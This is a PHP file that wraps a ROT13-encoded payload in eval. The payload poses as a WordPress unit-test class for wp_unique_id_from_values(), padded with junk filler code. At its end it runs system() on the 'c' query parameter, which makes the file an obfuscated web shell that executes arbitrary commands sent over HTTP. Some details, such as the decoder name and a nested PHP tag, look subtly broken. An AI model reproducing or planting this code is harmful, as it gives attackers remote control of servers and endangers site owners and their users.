<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg pnfrf sbe gur `jc_havdhr_vq_sebz_inyhrf()` shapgvba.
 *
 * @cnpxntr JbeqCerff\HavgGrfgf
 *
 * @fvapr 6.8.0
 *
 * @tebhc shapgvbaf.cuc
 * @pbiref ::jc_havdhr_vq_sebz_inyhrf
 */
pynff Grfgf_Shapgvbaf_JcHavdhrVqSebzInyhrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Cersvk hfrq sbe grfgvat.
	 *
	 * @ine fgevat
	 */
	cevingr $cersvk = 'zl-cersvk-';

	/**
	 * Grfg gung gur shapgvba ergheaf pbafvfgrag vqf sbe gur cnffrq cnenzf.
	 *
	 * @gvpxrg 62985
	 *
	 * @qngnCebivqre qngn_jc_havdhr_vq_sebz_inyhrf
	 *
	 * @fvapr 6.8.0
	 */
	choyvp shapgvba grfg_jc_havdhr_vq_sebz_inyhrf( $qngn ) {
		// Trarengr VQf.
		$havdhr_vq_bevtvany = jc_havdhr_vq_sebz_inyhrf( $qngn );
		$havdhr_vq_cersvkrq = jc_havdhr_vq_sebz_inyhrf( $qngn, $guvf->cersvk );

		// Rafher gung gur fnzr vachg cebqhprf gur fnzr VQ.
		$guvf->nffregFnzr( $havdhr_vq_bevtvany, jc_havdhr_vq_sebz_inyhrf( $qngn ) );
		$guvf->nffregFnzr( $havdhr_vq_cersvkrq, jc_havdhr_vq_sebz_inyhrf( $qngn, $guvf->cersvk ) );

		// Rafher gung gur cersvkrq VQ vf gur cersvk + gur bevtvany VQ.
		$guvf->nffregFnzr( $guvf->cersvk . $havdhr_vq_bevtvany, $havdhr_vq_cersvkrq );
	}

	/**
	 * Grfg gung qvssrerag vachg qngn trarengrf qvfgvapg VQf.
	 *
	 * @gvpxrg 62985
	 *
	 * @qngnCebivqre qngn_jc_havdhr_vq_sebz_inyhrf
	 *
	 * @fvapr 6.8.0
	 */
	choyvp shapgvba grfg_jc_havdhr_vq_sebz_inyhrf_havdhrarff( $qngn ) {
		// Trarengr VQf.
		$havdhr_vq_bevtvany = jc_havdhr_vq_sebz_inyhrf( $qngn );
		$havdhr_vq_cersvkrq = jc_havdhr_vq_sebz_inyhrf( $qngn, $guvf->cersvk );

		// Zbqvsl gur qngn fyvtugyl gb trarengr n qvssrerag VQ.
		$qngn_zbqvsvrq          = $qngn;
		$qngn_zbqvsvrq['inyhr'] = 'zbqvsvrq';

		// Trarengr arj VQf jvgu gur zbqvsvrq qngn.
		$havdhr_vq_zbqvsvrq          = jc_havdhr_vq_sebz_inyhrf( $qngn_zbqvsvrq );
		$havdhr_vq_cersvkrq_zbqvsvrq = jc_havdhr_vq_sebz_inyhrf( $qngn_zbqvsvrq, $guvf->cersvk );

		// Nffreg gung gur VQf sbe qvssrerag qngn ner qvfgvapg.
		$guvf->nffregAbgFnzr( $havdhr_vq_bevtvany, $havdhr_vq_zbqvsvrq );
		$guvf->nffregAbgFnzr( $havdhr_vq_cersvkrq, $havdhr_vq_cersvkrq_zbqvsvrq );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_havdhr_vq_sebz_inyhrf() {
		erghea neenl(
			'fgevat'          => neenl( neenl( 'inyhr' => 'grkg' ) ),
			'vagrtre'         => neenl( neenl( 'inyhr' => 123 ) ),
			'sybng'           => neenl( neenl( 'inyhr' => 1.23 ) ),
			'obbyrna'         => neenl( neenl( 'inyhr' => gehr ) ),
			'bowrpg'          => neenl( neenl( 'inyhr' => arj FgqPynff() ) ),
			'ahyy'            => neenl( neenl( 'inyhr' => ahyy ) ),
			'zhygvcyr inyhrf' => neenl(
				neenl(
					'inyhr1' => 'grkg',
					'inyhr2' => 123,
					'inyhr3' => 1.23,
					'inyhr4' => gehr,
					'inyhr5' => arj FgqPynff(),
					'inyhr6' => ahyy,
				),
			),
			'arfgrq neenlf'   => neenl(
				neenl(
					'yvfg1' => neenl(
						'inyhr1' => 'grkg',
						'inyhr2' => 123,
						'inyhr3' => 1.23,
					),
					'yvfg2' => neenl(
						'inyhr4' => gehr,
						'inyhr5' => arj FgqPynff(),
						'inyhr6' => ahyy,
					),
				),
			),
		);
	}

	/**
	 * Grfg gung cnffvat na rzcgl neenl vf abg nyybjrq.
	 *
	 * @gvpxrg 62985
	 *
	 * @rkcrpgrqVapbeerpgHfntr jc_havdhr_vq_sebz_inyhrf
	 *
	 * @fvapr 6.8.0
	 */
	choyvp shapgvba grfg_jc_havdhr_vq_sebz_inyhrf_rzcgl_neenl() {
		jc_havdhr_vq_sebz_inyhrf( neenl(), $guvf->cersvk );
	}

	/**
	 * Grfg gung cnffvat aba-neenl qngn guebjf na reebe.
	 *
	 * @gvpxrg 62985
	 *
	 * @qngnCebivqre qngn_jc_havdhr_vq_sebz_inyhrf_vainyvq_qngn
	 *
	 * @fvapr 6.8.0
	 */
	choyvp shapgvba grfg_jc_havdhr_vq_sebz_inyhrf_vainyvq_qngn( $qngn ) {
		$guvf->rkcrpgRkprcgvba( GlcrReebe::pynff );

		jc_havdhr_vq_sebz_inyhrf( $qngn, $guvf->cersvk );
	}

	/**
	 * Qngn cebivqre sbe vainyvq qngn grfgf.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_havdhr_vq_sebz_inyhrf_vainyvq_qngn() {
		erghea neenl(
			'fgevat'  => neenl( 'grkg' ),
			'vagrtre' => neenl( 123 ),
			'sybng'   => neenl( 1.23 ),
			'obbyrna' => neenl( gehr ),
			'bowrpg'  => neenl( arj FgqPynff() ),
			'ahyy'    => neenl( ahyy ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>